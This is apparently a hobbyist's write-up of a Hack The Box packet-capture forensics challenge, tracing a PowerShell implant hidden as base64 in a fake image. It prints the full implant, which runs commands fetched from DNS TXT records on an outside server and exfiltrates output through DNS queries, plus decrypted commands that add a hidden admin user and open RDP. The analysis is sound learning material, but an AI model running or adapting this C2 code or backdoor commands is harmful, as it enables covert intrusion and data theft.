This one looks fun, just a pcap packet capture.  I gave a class on wireshark a couple years ago at work, so lets see how terrible I am at it since I hardly ever have to use it anymore ;>

Looked at the pcap for a bit in wireshark.  Analyzed convo's, looked for many requests, didn't get anywhere rly for a bit, spent a while honestly tracking down legit traffic and other dumb things instead of going straight to http downloads..

Also took apart the pcap in an online analyzer after this; https://apackets.com/pcaps/flows  - This was pretty cool.

Happened to notice some requests to ‘windowsupdatelive.com’ which looks super funky..

```
10.0.2.15:49804   WINDoWslIVeupDATeR.cOM (77.74.198.52):80 (GET)
```

Found an image file in one of them, took it and saved to file it was white 64x64px or whatnot, but looked at it in a hex editor and its base64.  

Decoded base64 and got this:

```
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
   $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```


Looked up the key:

```
echo a1E4MUtycWswTmtrMHdqdg== | base64 -d
kQ81Krqk0Nkk0wjv
```

This doesn't mean much but maybe it can be used to decode some of the traffic!

Analyzed the rest of the traffic from 77.74.198.52

Ref'd back to the pcap it sent only this image back.

This was at packet 1931 - 19.145926

Found another request after with a UDP stream on port 53 (dns response is how the data is infiltrated!!)

```
{...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh
```

Took and tried to base64 -d these;
Played around a bit and got nowhere,  figured out to try to use the ps1 file above to decrypt..
However, they are not decrypting after putting them in this format. Can't figure this out so far. Moving on...


Found that a bunch of DNS queries were going out:


```
windowsliveupdater.com
start.windowsliveupdater.com
CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com
end.windowsliveupdater.com
7679895D1CF7C07BB6A348E1AA4AFC65.windowsliveupdater.com
5958A6856F1A34AAD5E97EA55B087670.windowsliveupdater.com
35F2497E5836EA0ECA1F1280F59742A3.windowsliveupdater.com
09E28DD82C14BC32513652DAC2F2C27B.windowsliveupdater.com
0D73A3288A980D8FCEF94BDDCF9E2822.windowsliveupdater.com
2A1CA17BB2D90FCD6158856348790414.windowsliveupdater.com
20FC39C684A9E371CC3A06542B666005.windowsliveupdater.com
5840BD94CCE65E23613925B4D9D2BA53.windowsliveupdater.com
18EA75BC653004D45D505ED62567017A.windowsliveupdater.com
6FA4E7593D83092F67A81082D9930E99.windowsliveupdater.com
BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com
A9B09FF558A8DF000ECBD37804CE663E.windowsliveupdater.com
3521599BC7591005AB6799C57068CF0D.windowsliveupdater.com
C6884CECF01C0CD44FD6B82DB788B35D.windowsliveupdater.com
62F02E4CAA1D973FBECC235AE9F40254.windowsliveupdater.com
C63D3C93C89930DA2C4F42D9FC123D8B.windowsliveupdater.com
AB00ACAB5198AFCC8C6ACD81B19CD264.windowsliveupdater.com
CC6353668CEA4C88C8AEEA1D58980022.windowsliveupdater.com
DA8FA2E917F17C28608818BF550FEA66.windowsliveupdater.com
973B5A8355258AB0AA281AD88F5B9EB1.windowsliveupdater.com
03AC666FE09A1D449736335C09484D27.windowsliveupdater.com
1C301C6D5780AB2C9FA333BE3B0185BF.windowsliveupdater.com
071FB1205C4DBEAA2241168B0748902A.windowsliveupdater.com
6CE14903C7C47E7C87311044CB9873A4.windowsliveupdater.com
ECABC349D27C0B0FFFD1ACEEDBE06BB6.windowsliveupdater.com
C2EB000EE4F9B35D6F001500E85642A2.windowsliveupdater.com
DCC8F1BE2CF4D667F458C1DE46D24B1C.windowsliveupdater.com
2E0F5D94E52649C70402C1B0A2FF7B49.windowsliveupdater.com
FC32DDD67F275307A74B2C4D0864B3F0.windowsliveupdater.com
486186DA9443EB747F717B3911C959DC.windowsliveupdater.com
7E300844D60655410C3988238E615D61.windowsliveupdater.com
6F33D27F63CE4D1E065A416911BC50D4.windowsliveupdater.com
58749599D2CB08DB561988EB2902E05D.windowsliveupdater.com
9886FDDAC2BED6F6DA73637AD2F20CF1.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
79472A243BFB0852AF372323EC132988.windowsliveupdater.com
3C81A3F2AEB1D3DAAE8496E1DBF97F43.windowsliveupdater.com
5AE40A09203B890C4A174D77CB7026C4.windowsliveupdater.com
E990A6FB6424A7501823AD31D3D6B634.windowsliveupdater.com
4C7971C8D447C078C4471732AD881C39.windowsliveupdater.com
4BC8B1A66E0BED43DDC359269B57D1D5.windowsliveupdater.com
D68DCD2A608BF61716BB47D6FE4D5C9D.windowsliveupdater.com
6E8BB2981F214A8234B0DD0210CA96EB.windowsliveupdater.com
2D6322B0F7F3D748C4C9F8B80EFF5A69.windowsliveupdater.com
21A3D1A8621A49F4D29BC9851D25230B.windowsliveupdater.com
841BDB4E9E5F8BF721B58E8308177B57.windowsliveupdater.com
2E9A015967DA5BF11AC9155FC2159C8F.windowsliveupdater.com
610CD82F818B4BDF5E48722DAF4BEEEB.windowsliveupdater.com
ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
282A23FEB3A21C3AD89882F5AC0DD3D5.windowsliveupdater.com
7D87875231652D0F4431EC37E51A09D5.windowsliveupdater.com
7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
```

Converted these to codes I can try to reverse..

```
cat reqs.txt | tr -s '.' ' ' | awk '{print $1}' > reqs2.txt
```

Soo.. Walked through EXACTLY whats happening here with the first request to Windowsliveupdater.com on port 80
returns /desktop.png
This is base64, gives us the ps1 script.
Lets break it down:

So there is a filter which just breaks the ‘query’ down to parts and doesn't stop the pipeline, just keeps outputting each part of the query:

```
filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
```

The first thing the script actually does, is reach out to 147.182.172.189 and do a dnsquery for windowsliveupdater.com and return the Strings as $out:

```
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
```

Looked at what this did on a another domain like windows.com, to get a look at how it might output:

```
PS C:\Users\cryptic.XDDEV> Resolve-DnsName -type TXT -DnsOnly windows.com | select-object -property Strings

Strings
-------
{v=spf1 mx -all}
{facebook-domain-verification=d65hkhpulntsek90x3rt1cqq4y06tk}
{D-TRUST=27XN9J9VBV6S24F}
```

This should show a bunch of txt records. 
Then, for each TXT record string, returned from the dns query (except for the last 2 lines?  Looks like these are blank automatically on the output):
```
for ($num = 0 ; $num -le $out.Length-2; $num++){
```

It looks like each time it checks the 1st line of each TXT record string (parsing blank lines)
```
$encryptedString = $out[$num].Strings[0]
```

So it decrypts this TXT record with the key above:
```
$backToPlainText = Decrypt-String $key $encryptedString
```

(Later added this line in to spit it out here:)
```
$backToPlainText
```

Then the Output will be the output of invoke-expression of $backToPlainText (split the next line into 2):
```
$output = iex $backToPlainText;
```

Then, the results will be the $output encrypted again into 32 char chunks:
```
$pr = Encrypt-String $key $output|parts 32
```

Then, it will let start.windowsliveupdater.com know of a response starting:

```
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
```
Foreach the the $pr public responses, do a lookup for $pr[ans].windowsliveupdater.com.   Exfiltration thru DNS complete.
```
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
```

Sends a response to end. telling it it is done.

```
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
```

So, now I need to look for the DNS response with the TXT records returned.  This should be near the first DNS request to 147.182.172.189, after the port 80 req.  Found it:

```
0000   08 00 27 d4 3a 20 52 54 00 12 35 02 08 00 45 00   ..'.: RT..5...E.
0010   03 7b 94 ba 00 00 40 11 96 35 93 b6 ac bd 0a 00   .{....@..5......
0020   02 0f 00 35 f7 60 03 67 36 c2 20 7b 85 80 00 01   ...5.`.g6. {....
0030   00 07 00 00 00 00 12 77 69 6e 64 6f 77 73 6c 69   .......windowsli
0040   76 65 75 70 64 61 74 65 72 03 63 6f 6d 00 00 10   veupdater.com...
0050   00 01 c0 0c 00 10 00 01 00 00 01 2c 00 2d 2c 49   ...........,.-,I
0060   66 75 31 79 69 4b 35 52 4d 41 42 44 34 77 6e 6f   fu1yiK5RMABD4wno
0070   36 36 61 78 49 47 5a 75 6a 31 48 58 65 7a 47 35   66axIGZuj1HXezG5
0080   67 78 7a 70 64 4c 4f 36 77 73 3d c0 0c 00 10 00   gxzpdLO6ws=.....
0090   01 00 00 01 2c 00 2d 2c 68 68 70 67 57 73 4f 6c   ....,.-,hhpgWsOl
00a0   69 34 41 6e 57 39 67 2f 37 54 4d 34 72 63 59 79   i4AnW9g/7TM4rcYy
00b0   76 44 4e 6b 79 34 79 5a 76 4c 56 4a 30 6f 6c 58   vDNky4yZvLVJ0olX
00c0   35 6f 41 3d c0 0c 00 10 00 01 00 00 01 2c 00 2d   5oA=.........,.-
00d0   2c 35 38 76 30 34 4b 68 72 53 7a 69 4f 79 52 61   ,58v04KhrSziOyRa
00e0   4d 4c 76 4b 4d 2b 4a 72 43 48 70 4d 34 57 6d 76   MLvKM+JrCHpM4Wmv
00f0   42 54 2f 77 59 54 52 4b 44 77 32 73 3d c0 0c 00   BT/wYTRKDw2s=...
0100   10 00 01 00 00 01 2c 00 81 80 65 54 74 66 55 67   ......,...eTtfUg
0110   63 63 68 6d 2f 52 32 37 59 4a 44 50 30 69 57 6e   cchm/R27YJDP0iWn
0120   58 48 79 30 32 69 6a 53 63 64 49 34 74 55 71 41   XHy02ijScdI4tUqA
0130   56 50 4b 47 66 33 6e 73 42 45 32 38 66 44 55 62   VPKGf3nsBE28fDUb
0140   71 30 43 38 43 6e 55 6e 4a 43 35 37 6c 78 55 4d   q0C8CnUnJC57lxUM
0150   59 46 53 71 48 70 42 35 62 68 6f 56 54 59 61 66   YFSqHpB5bhoVTYaf
0160   4e 5a 38 2b 69 6a 6e 4d 77 41 4d 79 34 68 70 30   NZ8+ijnMwAMy4hp0
0170   4f 34 46 65 48 30 58 6f 36 39 61 68 49 38 6e 64   O4FeH0Xo69ahI8nd
0180   55 66 49 73 69 44 2f 42 72 75 c0 0c 00 10 00 01   UfIsiD/Bru......
0190   00 00 01 2c 00 ed ec 42 62 76 57 63 57 68 52 54   ...,...BbvWcWhRT
01a0   6f 50 71 54 75 70 77 58 36 4b 66 37 41 30 6a 72   oPqTupwX6Kf7A0jr
01b0   4f 64 59 57 75 6d 71 61 4d 52 7a 36 75 50 63 6e   OdYWumqaMRz6uPcn
01c0   76 61 44 76 52 4b 59 32 2b 65 41 6c 30 71 54 33   vaDvRKY2+eAl0qT3
01d0   49 79 31 6b 55 47 57 47 53 45 6f 52 75 37 4d 6a   Iy1kUGWGSEoRu7Mj
01e0   71 78 59 6d 65 6b 37 38 75 76 7a 4d 54 61 48 38   qxYmek78uvzMTaH8
01f0   38 63 57 77 6c 67 55 4a 71 72 31 76 73 72 31 43   8cWwlgUJqr1vsr1C
0200   73 78 43 77 53 2f 4b 42 59 4a 58 68 75 6c 79 42   sxCwS/KBYJXhulyB
0210   63 4d 4d 59 4f 74 63 71 49 6d 4d 69 55 33 78 30   cMMYOtcqImMiU3x0
0220   52 7a 6c 73 46 58 54 55 66 31 67 69 4e 46 32 71   RzlsFXTUf1giNF2q
0230   5a 55 44 74 68 55 4e 37 5a 38 41 49 77 76 6d 7a   ZUDthUN7Z8AIwvmz
0240   30 61 2b 35 61 55 54 65 67 71 2f 70 50 46 73 4b   0a+5aUTegq/pPFsK
0250   30 69 37 59 4e 5a 73 4b 37 4a 45 6d 7a 2b 77 51   0i7YNZsK7JEmz+wQ
0260   37 44 73 2f 55 55 35 2b 53 73 75 62 57 59 64 74   7Ds/UU5+SsubWYdt
0270   78 6e 2b 6c 78 77 35 38 58 71 48 78 79 41 59 41   xn+lxw58XqHxyAYA
0280   6f 30 3d c0 0c 00 10 00 01 00 00 01 2c 00 ad ac   o0=.........,...
0290   76 4a 78 6c 63 4c 44 49 2f 30 73 50 75 72 76 61   vJxlcLDI/0sPurva
02a0   63 47 30 69 46 62 73 74 77 79 78 74 6b 2f 65 6c   cG0iFbstwyxtk/el
02b0   39 63 7a 47 78 54 41 6a 59 42 6d 55 5a 45 63 44   9czGxTAjYBmUZEcD
02c0   36 33 62 63 6f 39 75 7a 53 48 44 6f 54 76 50 31   63bco9uzSHDoTvP1
02d0   5a 55 39 61 65 35 56 57 37 4a 6e 76 39 6a 73 5a   ZU9ae5VW7Jnv9jsZ
02e0   48 4c 73 4f 73 38 64 76 78 73 49 4d 56 4d 7a 6a   HLsOs8dvxsIMVMzj
02f0   31 49 74 47 6f 33 64 54 2b 51 72 70 73 42 34 4d   1ItGo3dT+QrpsB4M
0300   39 77 57 35 63 6c 55 75 44 65 46 2f 43 33 6c 77   9wW5clUuDeF/C3lw
0310   43 52 6d 59 59 46 53 4c 4e 2f 63 55 4e 4f 48 35   CRmYYFSLN/cUNOH5
0320   2b 2b 59 6e 58 36 36 62 31 69 48 55 4a 54 42 43   ++YnX66b1iHUJTBC
0330   71 4c 78 69 45 66 54 68 6b 35 41 3d c0 0c 00 10   qLxiEfThk5A=....
0340   00 01 00 00 01 2c 00 41 40 4d 33 2f 2b 32 52 4a   .....,.A@M3/+2RJ
0350   2f 71 59 34 4f 2b 6e 63 6c 47 50 45 76 4a 4d 49   /qY4O+nclGPEvJMI
0360   4a 49 34 55 36 53 46 36 56 4c 38 41 4e 70 7a 39   JI4U6SF6VL8ANpz9
0370   59 36 6d 53 48 77 75 55 79 67 34 69 42 72 4d 72   Y6mSHwuUyg4iBrMr
0380   74 53 73 66 70 41 32 62 68                        tSsfpA2bh
```
Definitely tried cleaning these up and decrypting. Need to figure out why they won't decrypt. Maybe needs to be a slight diff format..

Keep running into issue with the 1st bytes not being able to be read into $bytes for the IV:

```
$bytes = [System.Convert]::FromBase64String($encryptedStringWithI ...

xddev\cryptic@cryptic-PC C:\Users\cryptic.XDDEV>powershell -exec bypass -file i4.ps1 
Exception calling "FromBase64String" with "1" argument(s): "The input is not a valid Base-64 string as it contains a non-base 64 character, more 
than two padding characters, or an illegal character among the padding characters. "
At C:\Users\cryptic.XDDEV\i4.ps1:47 char:5
+     $bytes = [System.Convert]::FromBase64String($encryptedStringWithI ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FormatException
 
Cannot index into a null array.
At i4.ps1:48 char:5
```

Output of each separately worked, so tried again with all 3-7 together.. nice!!

```
1
¶Í¯©Pl§¢../Ã
Ý..hostname........

2
Ë[.ö!È»]¿vÏ¨sõ	Àwhoami..........

3-7:
.h.©.Q.z7.M.Î
&.ipconfig........¿gQí..×0÷ÛX}.W.´wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value..........*
Äª¦3..O.ª.y.ê.net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr¦óZ.5[...$.U._¥;netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389......ZuT.
.ØÒ[Ô.ö÷õÀñnet start TermService...........

$part1='HTB{y0u_c4n_
```

I bet the last part is the first stuff I decrypted from each part, decrypted again

So, grabbed all of this in byte format and did this quick python to split into 16 char pieces:


```
cat conv.py

t = 'b6cdafa9506ca7a294022fc30add148b686f73746e616d6500000000000000006b391c01442c135b5875302a0295780f77686f616d6900000000000000000000e9a11450da2349238a3c887be4f35a5e6970636f6e6669670000000000000000bf6751ed8718d730f7db587d14571db4776d6963202f6e616d6573706163653a5c5c726f6f745c536563757269747943656e746572205041544820416e7469566972757350726f6475637420474554202f76616c7565000000000000000000002a0dc4aaa63315954f9faa8c7905ea166e657420757365722044656661756c7455737220224a484268636e51785053644956454a376554423158324d30626c386e22202f616464202f593b206e6574206c6f63616c67726f75702041646d696e6973747261746f7273202f6164642044656661756c745573723b206e6574206c6f63616c67726f7570202252656d6f7465204465736b746f7020557365727322202f6164642044656661756c74557372a6f35a9d355b819d0b241a55055fa53b6e65747368206164766669726577616c6c206669726577616c6c206164642072756c65206e616d653d225465726d696e616c2053657276657222206469723d696e20616374696f6e3d616c6c6f772070726f746f636f6c3d544350206c6f63616c706f72743d333338390000000000005a75540b0d14d8d25bd483f6f7f5c0f16e6574207374617274205465726d536572766963650000000000000000000000'
n = 32
lines=[t[i:i+n] for i in range(0, len(t), n)]

print(t)
print(lines)
```
split into lines with 2 parts so I can awk it:
```
['b6cdafa9506ca7a294022fc30add148b', '686f73746e616d650000000000000000', 
'6b391c01442c135b5875302a0295780f', '77686f616d6900000000000000000000', 
'bf6751ed8718d730f7db587d14571db4', '776d6963202f6e616d6573706163653a', 
'5c5c726f6f745c536563757269747943', '656e746572205041544820416e746956', 
'6972757350726f647563742047455420', '2f76616c756500000000000000000000', 
'2a0dc4aaa63315954f9faa8c7905ea16', '6e657420757365722044656661756c74', 
'55737220224a484268636e5178505364', '4956454a376554423158324d30626c38', 
'6e22202f616464202f593b206e657420', '6c6f63616c67726f75702041646d696e', 
'6973747261746f7273202f6164642044', '656661756c745573723b206e6574206c', 
'6f63616c67726f7570202252656d6f74', '65204465736b746f7020557365727322', 
'202f6164642044656661756c74557372', 'a6f35a9d355b819d0b241a55055fa53b', 
'6e65747368206164766669726577616c', '6c206669726577616c6c206164642072', 
'756c65206e616d653d225465726d696e', '616c2053657276657222206469723d69', 
'6e20616374696f6e3d616c6c6f772070', '726f746f636f6c3d544350206c6f6361', 
'6c706f72743d33333839000000000000', '5a75540b0d14d8d25bd483f6f7f5c0f1', 
'6e6574207374617274205465726d5365', '72766963650000000000000000000000']

525400123502080027d43a2008004500006575650000801100000a00020f93b6acbdd2fc003500514ce568bb010000010000000000002043433143394143323935384132453633363039323732453242344638463433361277696e646f77736c6976657570646174657203636f6d0000010001
```
Nope.. Idk why I can't seem to get these to be happy with the decryption process, oh well..

Couldn't get this.. Took a break from it for now..

# day2 - again!

took another stab at this after stopping for dinner (12 hr straight!!!)

okay great, taking a break really helped; played around and got this:



idk how I couldn't make it work before, just messed aroudn enough and finally got it. PHEW!

Decrypted all to:
```
CC1C9AC2958A2E63609272E2B4F8F436
32A806549B03AB7E4EB39771AEDA4A1B
C1006AC8A03F9776B08321BD6D5247BB

intergalacticopcenter...........

7679895D1CF7C07BB6A348E1AA4AFC65
5958A6856F1A34AAD5E97EA55B087670
35F2497E5836EA0ECA1F1280F59742A3

intergalacticop\sysadmin........

09E28DD82C14BC32513652DAC2F2C27B
0D73A3288A980D8FCEF94BDDCF9E2822
2A1CA17BB2D90FCD6158856348790414
20FC39C684A9E371CC3A06542B666005
5840BD94CCE65E23613925B4D9D2BA53
18EA75BC653004D45D505ED62567017A
6FA4E7593D83092F67A81082D9930E99
BA20E34AACC4774F067442C6622F5DA2
A9B09FF558A8DF000ECBD37804CE663E
3521599BC7591005AB6799C57068CF0D
C6884CECF01C0CD44FD6B82DB788B35D
62F02E4CAA1D973FBECC235AE9F40254
C63D3C93C89930DA2C4F42D9FC123D8B
AB00ACAB5198AFCC8C6ACD81B19CD264
CC6353668CEA4C88C8AEEA1D58980022
DA8FA2E917F17C28608818BF550FEA66
973B5A8355258AB0AA281AD88F5B9EB1
03AC666FE09A1D449736335C09484D27
1C301C6D5780AB2C9FA333BE3B0185BF
071FB1205C4DBEAA2241168B0748902A
6CE14903C7C47E7C87311044CB9873A4

 Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . : home    Link-local IPv6 Address . . . . . : fe80::fdbd:2c54:d6b:c384%6    IPv4 Address. . . . . . . . . . . : 10.0.2.15    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 10.0.2.2.....
 

ECABC349D27C0B0FFFD1ACEEDBE06BB6
C2EB000EE4F9B35D6F001500E85642A2
DCC8F1BE2CF4D667F458C1DE46D24B1C
2E0F5D94E52649C70402C1B0A2FF7B49
FC32DDD67F275307A74B2C4D0864B3F0
486186DA9443EB747F717B3911C959DC
7E300844D60655410C3988238E615D61
6F33D27F63CE4D1E065A416911BC50D4
58749599D2CB08DB561988EB2902E05D
9886FDDAC2BED6F6DA73637AD2F20CF1
99B8CE3D9DEE03C0180C7D1198B49C02
769E5EE4EAB896D7D3BB478EA1408167
79472A243BFB0852AF372323EC132988
3C81A3F2AEB1D3DAAE8496E1DBF97F43
5AE40A09203B890C4A174D77CB7026C4
E990A6FB6424A7501823AD31D3D6B634

    companyName=Panaman  displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}  instanceGuid={CD3EA3C2-91CB-4359-90DC-1E909147B6B0}  onAccessScanningEnabled=TRUE  pathToSignedProductExe=panantivir
```
YEA S0N.. GOT IT.. FLAG PART 2/2 yeaaaaaa. <#feelsgood>

Couldn't use this last string!? ah well dont need it looks like..
`4C7971C8D447C078C4471732AD881C39`

Put them together..

```
$part1='HTB{y0u_c4n_'
$part2=4utom4t3_but_y0u_c4nt_h1de}

HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```

This took WAY longer than I had expected.  Another guy I was working with found the pcap download much faster than me, and I helped him w/ the powershell a little bit.  Was a lot of fun talking shop w/ him.. sup fr0z ;>


Note: Source, possibly, from 2016- looks just like it:
```
https://gist.github.com/ctigeek/2a56648b923d198a6e60
```

